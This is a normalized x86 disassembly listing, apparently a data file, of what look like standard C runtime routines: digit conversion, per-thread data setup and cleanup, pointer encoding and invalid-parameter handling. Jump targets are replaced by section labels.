sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42e7a0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push [ ebp + 0x14 ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42e7d0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42e800
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn 0x8
mov [ eax ] edx
sub_42e820
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn 0x8
mov [ eax ] edx
sub_42e880
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
movzx esi [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_439419
movzx ecx [ eax + esi * 2 ]
xor eax eax
and ecx 0x8
test ecx ecx
pop esi
setne al
pop ebp
retn
mov ecx [ eax ]
cmp [ ecx + 0x4 ] 0x1
jle r-xdata
mov eax [ ecx ]
movzx ecx [ eax + esi * 2 ]
xor eax eax
and ecx 0x8
test ecx ecx
pop esi
setne al
pop ebp
retn
push eax
push 0x8
push esi
call sub_43dba1
mov ecx eax
add esp 0xc
xor eax eax
test ecx ecx
setne al
pop esi
pop ebp
retn
sub_42e940
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x30 ]
cmp al 0x9
ja r-xdata
lea eax [ ecx - 0x61 ]
cmp al 0x19
ja r-xdata
movsx eax cl
sub eax 0x30
pop ebp
retn
lea eax [ ecx - 0x41 ]
cmp al 0x19
ja r-xdata
movsx eax cl
sub eax 0x57
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
movsx eax cl
sub eax 0x37
pop ebp
retn
sub_42e980
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp cx 0x30
jb r-xdata
mov eax 0x41
cmp ax cx
ja r-xdata
cmp cx 0x3a
jae r-xdata
lea eax [ ecx - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp cx 0x5a
jbe r-xdata
mov eax 0xff10
cmp cx ax
jae r-xdata
movzx eax cx
sub eax 0x30
jmp r-xdata
or eax 0xffffffff
lea eax [ ecx - 0x61 ]
cmp ax 0x19
movzx eax cx
ja r-xdata
mov eax 0xff1a
cmp cx ax
jae r-xdata
mov eax 0x660
cmp cx ax
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
add eax 0xffffffc9
pop ebp
retn
sub eax 0x20
movzx eax cx
sub eax 0xff10
mov eax 0x66a
cmp cx ax
jae r-xdata
pop ebp
retn
mov eax 0x6f0
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0x660
jmp r-xdata
mov eax 0x6fa
cmp cx ax
jae r-xdata
mov eax 0x966
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0x6f0
jmp r-xdata
mov eax 0x970
cmp cx ax
jae r-xdata
mov eax 0x9e6
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0x966
jmp r-xdata
mov eax 0x9f0
cmp cx ax
jae r-xdata
mov eax 0xa66
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0x9e6
jmp r-xdata
mov eax 0xa70
cmp cx ax
jae r-xdata
mov eax 0xae6
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0xa66
jmp r-xdata
mov eax 0xaf0
cmp cx ax
jae r-xdata
mov eax 0xb66
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0xae6
jmp r-xdata
mov eax 0xb70
cmp cx ax
jae r-xdata
mov eax 0xc66
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0xb66
jmp r-xdata
mov eax 0xc70
cmp cx ax
jae r-xdata
mov eax 0xce6
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0xc66
jmp r-xdata
mov eax 0xcf0
cmp cx ax
jae r-xdata
mov eax 0xd66
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0xce6
jmp r-xdata
mov eax 0xd70
cmp cx ax
jae r-xdata
mov eax 0xe50
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0xd66
jmp r-xdata
mov eax 0xe5a
cmp cx ax
jae r-xdata
mov eax 0xed0
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0xe50
jmp r-xdata
mov eax 0xeda
cmp cx ax
jae r-xdata
mov eax 0xf20
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0xed0
jmp r-xdata
mov eax 0xf2a
cmp cx ax
jae r-xdata
mov eax 0x1040
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0xf20
jmp r-xdata
mov eax 0x104a
cmp cx ax
jae r-xdata
mov eax 0x17e0
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0x1040
jmp r-xdata
mov eax 0x17ea
cmp cx ax
jae r-xdata
mov eax 0x1810
cmp cx ax
jb r-xdata
movzx eax cx
sub eax 0x17e0
jmp r-xdata
mov eax 0x181a
cmp cx ax
jae r-xdata
movzx eax cx
sub eax 0x1810
jmp r-xdata
sub_42ec80
mov edi edi
push ebp
mov ebp esp
dec [ ecx ]
mov al [ ebp + 0x8 ]
mov ecx [ ecx ]
test al al
je r-xdata
pop ebp
retn 0x4
cmp [ ecx ] al
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
sub_42ecb0
mov edi edi
push ebp
mov ebp esp
add [ ecx ] 0xfffffffe
mov ax [ ebp + 0x8 ]
mov ecx [ ecx ]
test ax ax
je r-xdata
pop ebp
retn 0x4
cmp [ ecx ] ax
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
sub_42ed20
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov ecx 0xff10
cmp ax cx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov ecx 0xff1a
cmp ax cx
jae r-xdata
mov ecx 0x660
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xff10
pop ebp
retn
mov ecx 0x66a
cmp ax cx
jae r-xdata
mov ecx 0x6f0
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0x660
pop ebp
retn
mov ecx 0x6fa
cmp ax cx
jae r-xdata
mov ecx 0x966
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0x6f0
pop ebp
retn
mov ecx 0x970
cmp ax cx
jae r-xdata
mov ecx 0x9e6
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0x966
pop ebp
retn
mov ecx 0x9f0
cmp ax cx
jae r-xdata
mov ecx 0xa66
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0x9e6
pop ebp
retn
mov ecx 0xa70
cmp ax cx
jae r-xdata
mov ecx 0xae6
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xa66
pop ebp
retn
mov ecx 0xaf0
cmp ax cx
jae r-xdata
mov ecx 0xb66
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xae6
pop ebp
retn
mov ecx 0xb70
cmp ax cx
jae r-xdata
mov ecx 0xc66
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xb66
pop ebp
retn
mov ecx 0xc70
cmp ax cx
jae r-xdata
mov ecx 0xce6
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xc66
pop ebp
retn
mov ecx 0xcf0
cmp ax cx
jae r-xdata
mov ecx 0xd66
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xce6
pop ebp
retn
mov ecx 0xd70
cmp ax cx
jae r-xdata
mov ecx 0xe50
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xd66
pop ebp
retn
mov ecx 0xe5a
cmp ax cx
jae r-xdata
mov ecx 0xed0
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xe50
pop ebp
retn
mov ecx 0xeda
cmp ax cx
jae r-xdata
mov ecx 0xf20
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xed0
pop ebp
retn
mov ecx 0xf2a
cmp ax cx
jae r-xdata
mov ecx 0x1040
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0xf20
pop ebp
retn
mov ecx 0x104a
cmp ax cx
jae r-xdata
mov ecx 0x17e0
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0x1040
pop ebp
retn
mov ecx 0x17ea
cmp ax cx
jae r-xdata
mov ecx 0x1810
cmp ax cx
jb r-xdata
movzx eax ax
sub eax 0x17e0
pop ebp
retn
mov ecx 0x181a
cmp ax cx
jae r-xdata
movzx eax ax
sub eax 0x1810
pop ebp
retn
sub_42ef90
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push 0x0
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42efc0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push [ ebp + 0xc ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42eff0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push [ ebp + 0xc ]
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f020
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push [ ebp + 0xc ]
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f050
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push [ ebp + 0xc ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f07c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_439419
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
mov eax [ eax ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and eax [ ebp + 0xc ]
pop ebp
retn
sub_42f0a6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42f07c
mov eax [ ecx ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43dba1
jmp r-xdata
add esp 0xc
pop ebp
retn
sub_42f0e0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push 0x0
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f110
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push 0x0
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f140
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push [ ebp + 0xc ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f170
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push [ ebp + 0xc ]
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f1a0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push 0x0
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f1d0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push [ ebp + 0xc ]
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f200
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push 0x0
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f230
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d2b0
add esp 0xc
push [ ebp + 0xc ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f260
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push 0x0
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f290
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push 0x0
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f2c0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push 0xa
sub esp 0x8
mov eax esp
push 0x0
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push 0x0
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42f2eb
mov edi edi
push esi
push edi
mov edi rw-data
xor esi esi
push 0x0
call sub_42f343
pop ecx
xor al al
inc [ rw-data ]
add esi 0x18
add edi 0x18
cmp esi 0x138
jb r-xdata
push 0x0
push 0xfa0
push edi
call sub_430c30
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_42f343
mov edi edi
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov al 0x1
pop esi
retn
imul eax esi 0x18
push edi
lea edi [ eax + rw-data ]
push edi
call [ DeleteCriticalSection@IAT ]
dec [ rw-data ]
sub edi 0x18
sub esi 0x1
jne r-xdata
pop edi
sub_42f3af
push 0x8
push r--data
call sub_40d260
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
mov eax [ eax ]
push [ eax ]
mov eax [ ecx ]
push [ eax ]
call sub_42f992
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f3f3
call sub_40d2a6
retn 0xc
sub_42f3ff
push 0x8
push r--data
call sub_40d260
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f454
call sub_40d2a6
retn 0xc
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
cmp ecx rw-data
je r-xdata
push ecx
call sub_42d0aa
pop ecx
sub_42f460
push 0x8
push r--data
call sub_40d260
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax ]
call sub_42f992
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f49f
call sub_40d2a6
retn 0xc
sub_42f4ab
push 0x8
push r--data
call sub_40d260
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
[ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f4e7
call sub_40d2a6
retn 0xc
sub_42f4f3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42f3ff
mov esp ebp
pop ebp
retn
sub_42f51b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42f3af
mov esp ebp
pop ebp
retn
sub_42f543
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42f460
mov esp ebp
pop ebp
retn
sub_42f56b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42f4ab
mov esp ebp
pop ebp
retn
sub_42f6d1
mov eax [ ecx ]
mov eax [ eax ]
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
retn
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
cmp ecx rw-data
je r-xdata
push ecx
call sub_42d0aa
pop ecx
sub_42f745
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
inc ecx
push 0x43
mov [ eax + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x350 ] ecx
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax + 0x48 ] rw-data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] cx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x172 ] cx
mov eax [ ebp + 0x8 ]
and [ eax + 0x34c ] 0x0
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x5
call sub_42f56b
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
call sub_42f51b
add esp 0x10
mov esp ebp
pop ebp
retn
sub_42f7d7
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
push [ ebp + 0x8 ]
call sub_42f7f8
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ecx
sub_42f7f8
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp ecx r--data
je r-xdata
push [ eax + 0x3c ]
call sub_42d0aa
mov eax [ ebp + 0x8 ]
push [ eax + 0x30 ]
call sub_42d0aa
mov eax [ ebp + 0x8 ]
push [ eax + 0x34 ]
call sub_42d0aa
mov eax [ ebp + 0x8 ]
push [ eax + 0x38 ]
call sub_42d0aa
mov eax [ ebp + 0x8 ]
push [ eax + 0x28 ]
call sub_42d0aa
mov eax [ ebp + 0x8 ]
push [ eax + 0x2c ]
call sub_42d0aa
mov eax [ ebp + 0x8 ]
push [ eax + 0x40 ]
call sub_42d0aa
mov eax [ ebp + 0x8 ]
push [ eax + 0x44 ]
call sub_42d0aa
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x5
call sub_42f4f3
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x4
call sub_42f543
add esp 0x30
mov esp ebp
pop ebp
retn
push ecx
call sub_42d0aa
mov eax [ ebp + 0x8 ]
pop ecx
sub_42f8a1
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push esi
push edi
push 0x364
push 0x1
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push eax
call sub_43085f
test eax eax
jne r-xdata
xor edi edi
push esi
push [ rw-data ]
call sub_4308b5
test eax eax
je r-xdata
retn
push rw-data
push esi
call sub_42f745
pop ecx
mov edi esi
xor esi esi
pop ecx
jmp r-xdata
push esi
call sub_42d0aa
pop ecx
mov eax edi
pop edi
pop esi
sub_42f8fc
mov edi edi
push ebx
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
xor ebx ebx
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_42d196
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_43085f
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_4308b5
test eax eax
jne r-xdata
push ebx
mov ebx edi
push rw-data
push edi
call sub_42f745
push ebx
call sub_42d0aa
add esp 0xc
test edi edi
je r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
pop edi
pop esi
mov eax ebx
pop ebx
retn
call sub_42d0aa
pop ecx
jmp r-xdata
sub_42f992
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov [ esi + 0x4c ] eax
pop esi
test eax eax
je r-xdata
push [ esi + 0x4c ]
call sub_43b0bc
mov eax [ esi + 0x4c ]
pop ecx
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_43aed9
pop ecx
cmp eax rw-data
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
push eax
call sub_43af58
pop ecx
sub_42f9f1
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push esi
push eax
call sub_43085f
mov esi eax
test esi esi
je r-xdata
pop esi
push 0x0
push [ rw-data ]
call sub_4308b5
push esi
call sub_42f7d7
sub_42fa1d
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_42d196
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_43085f
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_4308b5
test eax eax
jne r-xdata
push eax
push esi
call [ SetLastError@IAT ]
mov eax edi
pop edi
pop esi
retn
push rw-data
push edi
call sub_42f745
push 0x0
call sub_42d0aa
add esp 0xc
test edi edi
je r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
call sub_42d153
call sub_42d0aa
pop ecx
jmp r-xdata
sub_42faa1
mov edi edi
push ebx
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
xor ebx ebx
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_42d196
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_43085f
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_4308b5
test eax eax
jne r-xdata
push ebx
push esi
call [ SetLastError@IAT ]
mov ebx edi
push rw-data
push edi
call sub_42f745
push ebx
call sub_42d0aa
add esp 0xc
test edi edi
jne r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
jmp r-xdata
call sub_42d0aa
pop ecx
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn
sub_42fb26
push sub_42f7d7
call sub_4307b3
mov [ rw-data ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_42faa1
test eax eax
jne r-xdata
xor al al
retn
mov al 0x1
retn
push eax
call sub_42fb52
pop ecx
jmp r-xdata
sub_42fb8e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_42fbad
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_42fbe1
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
push 0x50
lea eax [ ebp - 0x320 ]
push 0x0
push eax
call sub_40de60
push 0x2cc
lea eax [ ebp - 0x2d0 ]
push 0x0
push eax
call sub_40de60
lea eax [ ebp - 0x320 ]
add esp 0x18
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_40d1fa
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40c3ae
mov esp ebp
pop ebp
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_40d1fa
pop ecx
sub_42fd54
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_42faa1
test eax eax
je r-xdata
push [ ebp + 0x18 ]
mov esi [ rw-data ]
mov ecx esi
push [ ebp + 0x14 ]
xor esi [ rw-data ]
and ecx 0x1f
push [ ebp + 0x10 ]
ror esi cl
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov esi [ eax + 0x35c ]
test esi esi
je r-xdata
mov ecx esi
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
add esp 0x14
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
call sub_42fdfc
int3
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
sub_42fde1
push esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_42fd54
add esp 0x14
push esi
push esi
push esi
push esi
push esi
call sub_42fdfc
int3
sub_42fdfc
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_42fbe1
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_42fe2f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
push edi
push [ ebp + 0x8 ]
